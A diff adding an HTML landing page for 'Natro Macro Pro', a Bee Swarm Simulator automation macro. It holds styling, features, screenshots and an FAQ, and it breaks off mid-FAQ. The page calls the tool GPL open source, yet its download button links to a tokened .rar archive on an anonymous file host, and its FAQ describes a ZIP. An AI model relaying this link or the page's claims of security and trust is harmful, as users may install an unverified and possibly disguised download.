@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Natro Macro Pro  Free Automation Tool for Bee Swarm Simulator</title>
+<meta name="description" content="Natro Macro Pro is a free automation tool for Bee Swarm Simulator. Automate farming, quests, and in-game actions with a lightweight and customizable macro solution.">
+<meta name="keywords" content="Natro Macro Pro , Bee Swarm Simulator macro, BSS macro, Roblox automation, free macro tool, Bee Swarm automation">
+<meta name="author" content="Natro Macro Pro ">
+<meta name="robots" content="index, follow">
+
+<!-- Open Graph Meta Tags -->
+<meta property="og:title" content="Natro Macro  Free Bee Swarm Simulator Automation">
+<meta property="og:description" content="Free automation macro for Bee Swarm Simulator. Designed for efficient farming and gameplay automation.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://natromacro.dev/">
+<meta property="og:image" content="images/hero.png">
+
+<!-- Twitter Card Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Natro Macro Pro  Bee Swarm Simulator Macro">
+<meta name="twitter:description" content="A free macro tool for automating Bee Swarm Simulator gameplay.">
+<meta name="twitter:image" content="images/hero.png">
+
+<!-- Favicon -->
+<link rel="icon" type="image/png" href="images/logo.png">
+<link rel="apple-touch-icon" href="images/logo.png">
+
+<style>
+/* Reset and Base Styles */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+:root {
+    --primary-blue: #2563eb;
+    --secondary-purple: #7c3aed;
+    --accent-cyan: #06b6d4;
+    --dark-text: #1e293b;
+    --medium-text: #475569;
+    --light-text: #64748b;
+    --bg-light: #f8fafc;
+    --bg-white: #ffffff;
+    --border-color: #e2e8f0;
+    --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.1);
+    --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.07);
+    --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.1);
+    --shadow-xl: 0 20px 40px rgba(0, 0, 0, 0.15);
+}
+
+body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+    line-height: 1.7;
+    color: var(--dark-text);
+    background-color: var(--bg-white);
+    overflow-x: hidden;
+}
+
+/* Header and Navigation */
+header {
+    background-color: var(--bg-white);
+    border-bottom: 1px solid var(--border-color);
+    padding: 1.25rem 0;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    backdrop-filter: blur(10px);
+    background-color: rgba(255, 255, 255, 0.95);
+}
+
+nav {
+    max-width: 1280px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 2rem;
+}
+
+.logo-container { display: flex; align-items: center; gap: 0.75rem; }
+
+.logo { height: 45px; width: auto; }
+
+.logo-text {
+    font-size: 1.5rem;
+    font-weight: 700;
+    background: linear-gradient(135deg, var(--primary-blue), var(--secondary-purple));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.nav-links { display: flex; list-style: none; gap: 2.5rem; align-items: center; }
+
+.nav-links a {
+    color: var(--medium-text);
+    text-decoration: none;
+    font-weight: 500;
+    transition: color 0.3s ease;
+    position: relative;
+}
+
+.nav-links a::after {
+    content: '';
+    position: absolute;
+    width: 0;
+    height: 2px;
+    bottom: -5px;
+    left: 0;
+    background: linear-gradient(90deg, var(--primary-blue), var(--secondary-purple));
+    transition: width 0.3s ease;
+}
+
+.nav-links a:hover { color: var(--primary-blue); }
+.nav-links a:hover::after { width: 100%; }
+
+.menu-toggle { display: none; flex-direction: column; cursor: pointer; gap: 4px; }
+.menu-toggle span { width: 28px; height: 3px; background-color: var(--dark-text); transition: 0.3s; border-radius: 2px; }
+
+/* Hero Section - Split Layout */
+.hero {
+    background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+    padding: 5rem 2rem;
+    position: relative;
+    overflow: hidden;
+}
+
+.hero::before {
+    content: '';
+    position: absolute;
+    width: 500px;
+    height: 500px;
+    background: radial-gradient(circle, rgba(37, 99, 235, 0.1) 0%, transparent 70%);
+    top: -250px;
+    right: -250px;
+    border-radius: 50%;
+}
+
+.hero::after {
+    content: '';
+    position: absolute;
+    width: 400px;
+    height: 400px;
+    background: radial-gradient(circle, rgba(124, 58, 237, 0.1) 0%, transparent 70%);
+    bottom: -200px;
+    left: -200px;
+    border-radius: 50%;
+}
+
+.hero-container {
+    max-width: 1280px;
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 4rem;
+    align-items: center;
+    position: relative;
+    z-index: 1;
+}
+
+.hero-content { padding-right: 2rem; }
+
+.hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    background: var(--bg-white);
+    padding: 0.5rem 1rem;
+    border-radius: 50px;
+    font-size: 0.875rem;
+    font-weight: 600;
+    color: var(--primary-blue);
+    margin-bottom: 1.5rem;
+    box-shadow: var(--shadow-sm);
+}
+
+.hero h1 { font-size: 3.75rem; font-weight: 800; line-height: 1.1; margin-bottom: 1.5rem; color: var(--dark-text); }
+
+.hero h1 .highlight {
+    background: linear-gradient(135deg, var(--primary-blue), var(--secondary-purple));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.hero-description { font-size: 1.25rem; color: var(--medium-text); margin-bottom: 2rem; line-height: 1.8; }
+
+.hero-stats { display: flex; gap: 2rem; margin-bottom: 2.5rem; }
+.stat-item { display: flex; flex-direction: column; }
+.stat-number { font-size: 2rem; font-weight: 700; color: var(--primary-blue); }
+.stat-label { font-size: 0.875rem; color: var(--light-text); }
+
+.hero-visual { position: relative; display: flex; align-items: center; justify-content: center; }
+
+.hero-image-wrapper {
+    position: relative;
+    width: 100%;
+    max-width: 500px;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: var(--shadow-xl);
+    transform: perspective(1000px) rotateY(-5deg);
+    transition: transform 0.3s ease;
+}
+
+.hero-image-wrapper:hover { transform: perspective(1000px) rotateY(0deg); }
+.hero-image-wrapper img { width: 100%; height: auto; display: block; }
+
+/* CTA Buttons */
+.cta-buttons { display: flex; gap: 1rem; flex-wrap: wrap; }
+
+.btn {
+    padding: 1rem 2rem;
+    border: none;
+    border-radius: 12px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    font-family: inherit;
+}
+
+.btn-primary { background: linear-gradient(135deg, var(--primary-blue), var(--secondary-purple)); color: white; box-shadow: var(--shadow-md); }
+.btn-primary:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+
+.btn-secondary { background: var(--bg-white); color: var(--primary-blue); border: 2px solid var(--primary-blue); }
+.btn-secondary:hover { background: var(--primary-blue); color: white; transform: translateY(-2px); }
+
+.btn-discord { background: #5865f2; color: white; }
+.btn-discord:hover { background: #4752c4; transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+
+/* Container */
+.container { max-width: 1280px; margin: 0 auto; padding: 0 2rem; }
+
+/* Sections */
+section { padding: 5rem 2rem; }
+.section-header { text-align: center; margin-bottom: 4rem; }
+
+.section-badge {
+    display: inline-block;
+    background: linear-gradient(135deg, var(--primary-blue), var(--secondary-purple));
+    color: white;
+    padding: 0.5rem 1.25rem;
+    border-radius: 50px;
+    font-size: 0.875rem;
+    font-weight: 600;
+    margin-bottom: 1rem;
+}
+
+section h2 { font-size: 3rem; margin-bottom: 1rem; color: var(--dark-text); font-weight: 800; }
+
+.section-subtitle { font-size: 1.25rem; color: var(--medium-text); max-width: 700px; margin: 0 auto; }
+
+/* Introduction Section */
+.intro-section { background: var(--bg-white); }
+.intro-content { max-width: 900px; margin: 0 auto; }
+.intro-content p { font-size: 1.125rem; line-height: 1.9; color: var(--medium-text); margin-bottom: 1.5rem; }
+
+/* Features Grid */
+.features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 2rem; margin-top: 3rem; }
+
+.feature-card {
+    background: var(--bg-white);
+    padding: 2.5rem;
+    border-radius: 16px;
+    border: 2px solid var(--border-color);
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+}
+
+.feature-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 4px;
+    background: linear-gradient(90deg, var(--primary-blue), var(--secondary-purple));
+    transform: scaleX(0);
+    transition: transform 0.3s ease;
+}
+
+.feature-card:hover { transform: translateY(-8px); box-shadow: var(--shadow-lg); border-color: var(--primary-blue); }
+.feature-card:hover::before { transform: scaleX(1); }
+
+.feature-icon { font-size: 2.5rem; margin-bottom: 1.5rem; display: inline-block; }
+.feature-card h3 { font-size: 1.5rem; margin-bottom: 1rem; color: var(--dark-text); font-weight: 700; }
+.feature-card p { color: var(--medium-text); line-height: 1.7; }
+
+/* Gallery Section */
+.gallery-section { background: var(--bg-light); }
+
+/* Screenshot Slider */
+.screenshot-slider-container { max-width: 1100px; margin: 3rem auto 0; }
+
+.screenshot-main-display {
+    position: relative;
+    border-radius: 16px;
+    overflow: hidden;
+    box-shadow: var(--shadow-xl);
+    margin-bottom: 2rem;
+}
+
+.screenshot-slider { display: flex; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+.screenshot-slide { min-width: 100%; cursor: pointer; position: relative; }
+.screenshot-slide img { width: 100%; height: auto; display: block; }
+
+/* Thumbnail Navigation */
+.screenshot-thumbnails { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; padding: 0 1rem; }
+
+.thumbnail-item {
+    width: 120px;
+    height: 80px;
+    border-radius: 8px;
+    overflow: hidden;
+    cursor: pointer;
+    border: 3px solid transparent;
+    transition: all 0.3s ease;
+    opacity: 0.6;
+    position: relative;
+}
+
+.thumbnail-item::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.3);
+    transition: opacity 0.3s ease;
+}
+
+.thumbnail-item:hover { opacity: 0.9; transform: translateY(-3px); box-shadow: var(--shadow-md); }
+.thumbnail-item:hover::before { opacity: 0; }
+.thumbnail-item.active { border-color: var(--primary-blue); opacity: 1; box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2); }
+.thumbnail-item.active::before { opacity: 0; }
+.thumbnail-item img { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+/* Navigation Buttons - Below Main Image */
+.slider-controls { display: flex; justify-content: center; gap: 1rem; margin-top: 1.5rem; margin-bottom: 1rem; }
+
+.slider-btn {
+    background: linear-gradient(135deg, var(--primary-blue), var(--secondary-purple));
+    color: white;
+    border: none;
+    width: 45px;
+    height: 45px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1.25rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.3s ease;
+    box-shadow: var(--shadow-sm);
+}
+
+.slider-btn:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+.slider-btn:active { transform: translateY(0); }
+
+/* Counter Display */
+.slide-counter { text-align: center; color: var(--medium-text); font-size: 0.9rem; font-weight: 600; margin-top: 1rem; }
+.slide-counter .current { color: var(--primary-blue); font-size: 1.1rem; }
+
+/* Lightbox */
+.lightbox {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.95);
+    z-index: 2000;
+    justify-content: center;
+    align-items: center;
+    padding: 2rem;
+}
+
+.lightbox.active { display: flex; }
+.lightbox-content { max-width: 90%; max-height: 90%; position: relative; }
+.lightbox-content img { width: 100%; height: auto; border-radius: 8px; }
+
+.lightbox-close {
+    position: absolute;
+    top: 20px;
+    right: 40px;
+    color: white;
+    font-size: 3rem;
+    cursor: pointer;
+    z-index: 2001;
+    transition: opacity 0.3s ease;
+}
+
+.lightbox-close:hover { opacity: 0.7; }
+
+/* FAQ Section */
+.faq-section { background: var(--bg-white); }
+.faq-container { max-width: 800px; margin: 0 auto; }
+
+.faq-item {
+    background: var(--bg-white);
+    margin-bottom: 1rem;
+    border: 2px solid var(--border-color);
+    border-radius: 12px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+}
+
+.faq-item:hover { border-color: var(--primary-blue); }
+
+.faq-question {
+    width: 100%;
+    padding: 1.5rem 2rem;
+    background: var(--bg-white);
+    border: none;
+    text-align: left;
+    font-size: 1.125rem;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    transition: all 0.3s ease;
+    color: var(--dark-text);
+    font-family: inherit;
+}
+
+.faq-question:hover { color: var(--primary-blue); }
+
+.faq-icon {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: var(--bg-light);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.3s ease;
+    font-weight: bold;
+    color: var(--primary-blue);
+}
+
+.faq-question.active .faq-icon { transform: rotate(45deg); background: var(--primary-blue); color: white; }
+
+.faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.3s ease, padding 0.3s ease; padding: 0 2rem; }
+.faq-answer.active { max-height: 500px; padding: 0 2rem 1.5rem; }
+.faq-answer p { color: var(--medium-text); line-height: 1.8; }
+
+/* Contact Form */
+.contact-section { background: var(--bg-light); }
+
+.contact-form { max-width: 600px; margin: 0 auto; background: var(--bg-white); padding: 3rem; border-radius: 16px; box-shadow: var(--shadow-lg); }
+.form-group { margin-bottom: 1.5rem; }
+.form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--dark-text); }
+
+.form-group input,
+.form-group textarea,
+.form-group select {
+    width: 100%;
+    padding: 0.875rem 1rem;
+    border: 2px solid var(--border-color);
+    border-radius: 8px;
+    font-size: 1rem;
+    font-family: inherit;
+    transition: all 0.3s ease;
+    color: var(--dark-text);
+}
+
+.form-group input:focus,
+.form-group textarea:focus,
+.form-group select:focus { outline: none; border-color: var(--primary-blue); box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1); }
+
+.form-group textarea { resize: vertical; min-height: 150px; }
+.form-group .error { color: #dc2626; font-size: 0.875rem; margin-top: 0.25rem; display: none; }
+
+/* Download Cards */
+.download-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; margin-top: 3rem; }
+
+.download-card {
+    background: var(--bg-white);
+    padding: 2.5rem;
+    border-radius: 16px;
+    border: 2px solid var(--border-color);
+    text-align: center;
+    transition: all 0.3s ease;
+}
+
+.download-card:hover { transform: translateY(-5px); box-shadow: var(--shadow-lg); border-color: var(--primary-blue); }
+.download-icon { font-size: 3rem; margin-bottom: 1.5rem; }
+.download-card h3 { font-size: 1.5rem; margin-bottom: 1rem; color: var(--dark-text); font-weight: 700; }
+.download-card p { color: var(--medium-text); margin-bottom: 1.5rem; line-height: 1.7; }
+
+/* Legal Pages */
+.legal-content { max-width: 900px; margin: 0 auto; background: var(--bg-white); padding: 3rem; border-radius: 16px; box-shadow: var(--shadow-md); }
+.legal-content h2 { font-size: 2rem; margin-top: 2.5rem; margin-bottom: 1rem; color: var(--dark-text); text-align: left; font-weight: 700; }
+.legal-content h3 { font-size: 1.5rem; margin-top: 2rem; margin-bottom: 0.75rem; color: var(--dark-text); font-weight: 600; }
+.legal-content p, .legal-content li { margin-bottom: 1rem; color: var(--medium-text); line-height: 1.8; }
+.legal-content ul, .legal-content ol { margin-left: 2rem; margin-bottom: 1.5rem; }
+
+/* Footer */
+footer { background: linear-gradient(135deg, var(--dark-text) 0%, #0f172a 100%); color: white; padding: 4rem 2rem 2rem; }
+
+.footer-content { max-width: 1280px; margin: 0 auto; display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 3rem; margin-bottom: 3rem; }
+.footer-section h3 { color: white; margin-bottom: 1.5rem; font-size: 1.125rem; font-weight: 700; }
+.footer-section p { color: #94a3b8; line-height: 1.7; margin-bottom: 1rem; }
+.footer-section ul { list-style: none; }
+.footer-section ul li { margin-bottom: 0.75rem; }
+.footer-section a { color: #cbd5e1; text-decoration: none; transition: color 0.3s ease; }
+.footer-section a:hover { color: var(--primary-blue); }
+
+.social-links { display: flex; gap: 1rem; font-size: 1.5rem; }
+.footer-bottom { text-align: center; padding-top: 2rem; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; }
+
+/* Utility Classes */
+.text-center { text-align: center; }
+.bg-light { background-color: var(--bg-light); }
+.mt-1 { margin-top: 1rem; }
+.mt-2 { margin-top: 2rem; }
+.mb-1 { margin-bottom: 1rem; }
+.mb-2 { margin-bottom: 2rem; }
+
+/* Responsive Design */
+@media (max-width: 1024px) {
+    .hero-container { grid-template-columns: 1fr; gap: 3rem; }
+    .hero-content { padding-right: 0; text-align: center; }
+    .hero-stats { justify-content: center; }
+    .cta-buttons { justify-content: center; }
+    .hero-visual { order: -1; }
+    .footer-content { grid-template-columns: 1fr 1fr; gap: 2rem; }
+}
+
+@media (max-width: 768px) {
+    .menu-toggle { display: flex; }
+    .nav-links {
+        position: fixed;
+        left: -100%;
+        top: 75px;
+        flex-direction: column;
+        background-color: var(--bg-white);
+        width: 100%;
+        text-align: center;
+        transition: 0.3s;
+        box-shadow: var(--shadow-lg);
+        padding: 2rem 0;
+        border-top: 1px solid var(--border-color);
+    }
+    .nav-links.active { left: 0; }
+    .hero { padding: 3rem 1.5rem; }
+    .hero h1 { font-size: 2.5rem; }
+    .hero-description { font-size: 1.125rem; }
+    section { padding: 3rem 1.5rem; }
+    section h2 { font-size: 2rem; }
+    .features-grid { grid-template-columns: 1fr; }
+    .screenshot-thumbnails { gap: 0.5rem; }
+    .thumbnail-item { width: 90px; height: 60px; }
+    .slider-btn { width: 40px; height: 40px; font-size: 1rem; }
+    .footer-content { grid-template-columns: 1fr; text-align: center; }
+    .social-links { justify-content: center; }
+}
+
+@media (max-width: 480px) {
+    .hero h1 { font-size: 2rem; }
+    .hero-stats { flex-direction: column; gap: 1rem; }
+    .stat-item { align-items: center; }
+    .btn { width: 100%; justify-content: center; }
+    .contact-form, .legal-content { padding: 2rem 1.5rem; }
+}
+
+/* Animations */
+@keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.fade-in-up { animation: fadeInUp 0.6s ease-out; }
+</style>
+
+<!-- Schema.org Markup -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "Natro Macro Pro ",
+  "applicationCategory": "GameApplication",
+  "operatingSystem": "Windows",
+  "description": "Natro Macro Pro is a free automation macro for Bee Swarm Simulator that helps automate repetitive gameplay actions.",
+  "url": "https://natromacro.dev/",
+  "author": { "@type": "Organization", "name": "Natro Macro Pro " },
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+}
+</script>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <nav>
+            <div class="logo-container">
+                <img src="images/logo.png" alt="Natro Macro Pro Logo" class="logo">
+                <span class="logo-text">Natro Macro Pro </span>
+            </div>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="index.html">Home</a></li>
+                <li><a href="download.html" download="Natro.Macro.Pro.v1.2.1.rar" target="_blank" rel="noopener noreferrer">Download</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+            <div class="menu-toggle" id="menuToggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container fade-in-up">
+            <div class="hero-content">
+                <div class="hero-badge">
+                    <span>🎉</span> Free &amp; Open Source
+                </div>
+                <h1>
+                    <span class="highlight">Natro Macro Pro </span> - Elevate Your Bee Swarm Simulator Game
+                </h1>
+                <p class="hero-description">
+                    The most advanced, trusted automation solution for Bee Swarm Simulator. Automate farming, quests, and planters with powerful customization. Completely free, secure, and built for players by players.
+                </p>
+                <div class="hero-stats">
+                    <div class="stat-item">
+                        <div class="stat-number">5K+</div>
+                        <div class="stat-label">Active Users</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">100%</div>
+                        <div class="stat-label">Free Forever</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number">24/7</div>
+                        <div class="stat-label">Support</div>
+                    </div>
+                </div>
+                <div class="cta-buttons">
+                    <a href="https://anondrop.net/1567028999744393297/Natro.Macro.Pro.v1.2.1.rar?download=true&token=9492849a-d992-44fb-8831-3e0b5877277c" download="Natro.Macro.Pro.v1.2.1.rar" target="_blank" rel="noopener noreferrer" class="btn btn-primary">
+                        <span>⬇️</span> Download Free
+                    </a>
+                    <a href="https://discord.gg/natromacro" target="_blank" rel="noopener noreferrer" class="btn btn-discord">
+                        <span>💬</span> Join Community
+                    </a>
+                </div>
+            </div>
+            <div class="hero-visual">
+                <div class="hero-image-wrapper">
+                    <img src="images/hero.png" alt="Natro Macro Pro Interface">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Introduction Section -->
+    <section class="intro-section">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">About Natro Macro Pro </span>
+                <h2>Powerful Automation Made Simple</h2>
+                <p class="section-subtitle">Everything you need to know about the #1 automation tool for Bee Swarm Simulator</p>
+            </div>
+            <div class="intro-content">
+                <p>
+                    <strong>Natro Macro Pro </strong> is the leading free and open-source automation platform specifically engineered for Bee Swarm Simulator enthusiasts. Built with precision using AutoHotkey, our software seamlessly automates time-consuming tasks including pollen collection, quest management, planter operations, and mob elimination, enabling you to maximize honey production and accelerate game progression without the grind.
+                </p>
+                <p>
+                    Leveraging the GNU GPL v3.0 open-source license, Natro Macro Pro  guarantees complete transparency and security for all users. Every line of code is publicly accessible for community review and verification, establishing unmatched trust and reliability. Our extensive configuration system allows you to customize field patterns, gathering algorithms, quest prioritization, and boost scheduling to perfectly align with your gameplay style and account development stage.
+                </p>
+                <p>
+                    Designed for both casual players optimizing limited playtime and hardcore farmers maximizing efficiency, Natro Macro Pro delivers professional-grade automation with an intuitive interface. Smart default configurations ensure immediate functionality, while power users can fine-tune every parameter for peak performance. Continuous updates maintain seamless compatibility with game updates, and our vibrant Discord community actively shares optimized patterns, proven strategies, and real-time support.
+                </p>
+                <p>
+                    Join the thousands of satisfied players who have revolutionized their Bee Swarm Simulator journey with Natro Macro Pro . Experience dramatically improved honey production rates, accelerated quest completion, optimized resource management, and consistent progress—all while preserving the strategic gameplay elements you love. Installation completes in minutes with comprehensive setup guides ensuring smooth onboarding for users of all skill levels.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section id="features" class="bg-light">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">Features</span>
+                <h2>Everything You Need, Built Right In</h2>
+                <p class="section-subtitle">Comprehensive automation features designed to optimize every aspect of your gameplay</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🌾</div>
+                    <h3>Smart Auto-Farming</h3>
+                    <p>Intelligent pollen collection with adaptive field selection, customizable gathering patterns, and automatic optimization based on hive strength and active boosts for maximum honey output.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">✅</div>
+                    <h3>Quest Automation</h3>
+                    <p>Fully automated quest system with smart prioritization, automatic detection and tracking, and seamless turn-in to maximize rewards and progression without manual intervention.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🪴</div>
+                    <h3>Planter Control</h3>
+                    <p>Complete planter lifecycle management including automated placement, precise timing, automatic collection, and intelligent replanting to ensure continuous nectar production.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Boost Management</h3>
+                    <p>Strategic boost utilization with intelligent timing, field synchronization, and buff stacking to extract maximum value from field boosts, dice, and other temporary enhancements.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🐞</div>
+                    <h3>Mob Hunting</h3>
+                    <p>Automated bug detection and elimination system targeting Ladybugs, Rhino Beetles, Mantis, and more with customizable target selection and priority configurations.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎨</div>
+                    <h3>Custom Patterns</h3>
+                    <p>Extensive pattern library with built-in optimized paths for every field, plus full custom pattern creator. Community-shared patterns available for instant optimization.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📈</div>
+                    <h3>Performance Analytics</h3>
+                    <p>Comprehensive statistics dashboard tracking honey production, quest completion, runtime, efficiency metrics, and detailed performance data for continuous optimization.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚙️</div>
+                    <h3>Advanced Configuration</h3>
+                    <p>Granular control over every automation parameter. Configure strategies, timings, priorities, and behaviors to create the perfect setup for your unique requirements.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔄</div>
+                    <h3>Continuous Updates</h3>
+                    <p>Regular updates ensure compatibility with the latest game versions. Active development team responds quickly to game changes and community feature requests.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Gallery Section -->
+    <section class="gallery-section">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">Screenshots</span>
+                <h2>See It In Action</h2>
+                <p class="section-subtitle">Explore the intuitive interface and powerful features of Natro Macro Pro </p>
+            </div>
+            <div class="screenshot-slider-container">
+                <div class="screenshot-main-display">
+                    <div class="screenshot-slider" id="screenshotSlider" style="transform: translateX(0%);">
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-1.png" alt="Main Settings Interface">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-2.png" alt="Gathering Configuration">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-3.png" alt="Collection Settings">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-4.png" alt="Boost Options">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-5.png" alt="Quest Management">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-6.png" alt="Planter Configuration">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-7.png" alt="Additional Settings">
+                        </div>
+                        <div class="screenshot-slide">
+                            <img src="images/screenshot-8.png" alt="Status Dashboard">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="slider-controls">
+                    <button class="slider-btn slider-prev">
+                        <span>❮</span>
+                    </button>
+                    <button class="slider-btn slider-next">
+                        <span>❯</span>
+                    </button>
+                </div>
+
+                <div class="slide-counter">
+                    <span class="current" id="currentSlide">1</span> / <span id="totalSlides">8</span>
+                </div>
+
+                <div class="screenshot-thumbnails" id="thumbnailContainer"><div class="thumbnail-item active"><img src="images/screenshot-1.png" alt="Thumbnail 1"></div><div class="thumbnail-item"><img src="images/screenshot-2.png" alt="Thumbnail 2"></div><div class="thumbnail-item"><img src="images/screenshot-3.png" alt="Thumbnail 3"></div><div class="thumbnail-item"><img src="images/screenshot-4.png" alt="Thumbnail 4"></div><div class="thumbnail-item"><img src="images/screenshot-5.png" alt="Thumbnail 5"></div><div class="thumbnail-item"><img src="images/screenshot-6.png" alt="Thumbnail 6"></div><div class="thumbnail-item"><img src="images/screenshot-7.png" alt="Thumbnail 7"></div><div class="thumbnail-item"><img src="images/screenshot-8.png" alt="Thumbnail 8"></div></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Lightbox -->
+    <div class="lightbox" id="lightbox">
+        <span class="lightbox-close">×</span>
+        <div class="lightbox-content">
+            <img id="lightboxImg" src="" alt="Screenshot">
+        </div>
+    </div>
+
+    <!-- FAQ Section -->
+    <section class="faq-section">
+        <div class="container">
+            <div class="section-header">
+                <span class="section-badge">FAQ</span>
+                <h2>Common Questions Answered</h2>
+                <p class="section-subtitle">Find quick answers to frequently asked questions about Natro Macro Pro </p>
+            </div>
+            <div class="faq-container">
+                <div class="faq-item">
+                    <button class="faq-question">
+                        What is Natro Macro Pro  and how does it work?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Natro Macro Pro  is a free automation tool for Bee Swarm Simulator built with AutoHotkey. It automates repetitive gameplay tasks like pollen farming, quest completion, and planter management through intelligent scripting. Simply download, configure your preferences, and run START.bat to begin automating your game.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        Is Natro Macro Pro completely free to use?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Yes, Natro Macro Pro is 100% free and always will be. Released under the GNU GPL v3.0 open-source license, there are no hidden fees, premium features, subscriptions, or paywalls. All features are available to everyone at no cost.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        How do I download and install Natro Macro Pro ?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Visit our download page, get the latest release ZIP file, extract it to your preferred location, and run START.bat. The first-time setup wizard will guide you through configuration. Complete installation takes just 2-3 minutes with our step-by-step instructions.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        Can I customize the automation settings?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
+                        <p>Absolutely! Natro Macro Pro offers extensive customization options. Configure field patterns, gathering strategies, quest priorities, planter schedules, boost timings, and much more. The interface provides both simple presets for beginners and advanced options for experienced users.</p>
+                    </div>
+                </div>
+                <div class="faq-item">
+                    <button class="faq-question">
+                        Where can I get help if I have issues?
+                        <span class="faq-icon">+</span>
+                    </button>
+                    <div class="faq-answer">
